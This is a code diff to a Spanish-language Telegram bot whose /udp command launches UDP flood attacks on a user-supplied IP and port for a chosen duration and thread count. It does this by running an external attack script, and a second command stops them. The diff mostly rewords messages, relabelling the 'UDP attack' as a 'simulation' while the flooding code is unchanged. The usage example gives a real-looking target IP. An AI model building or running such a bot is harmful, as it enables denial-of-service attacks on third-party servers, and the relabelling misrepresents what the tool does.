@@ -10,7 +10,7 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Verifica que el usuario haya ingresado los parámetros necesarios
     if len(context.args) < 3:
         await update.message.reply_text(
-            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999 :)"
+            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
         )
         return
 
@@ -26,20 +26,20 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         await update.message.reply_text(
-            f"Ataque UDP iniciado:\n- Target: {target}\n- Duración: {duration} \n- Threads: {threads}"
+            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
         )
     except Exception as e:
         await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")
 
 # Comando para detener el ataque
 async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Comando exacto para detener el ataque
+    # Construye el comando para detener el ataque
     command = "python3 start.py stop"
     
     # Ejecuta el comando y responde al usuario
     try:
         process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        await update.message.reply_text("El ataque ha sido detenido.")
+        await update.message.reply_text("Todos los ataques han sido detenidos.")
     except Exception as e:
         await update.message.reply_text(f"Error al detener el ataque:\n{str(e)}")
 
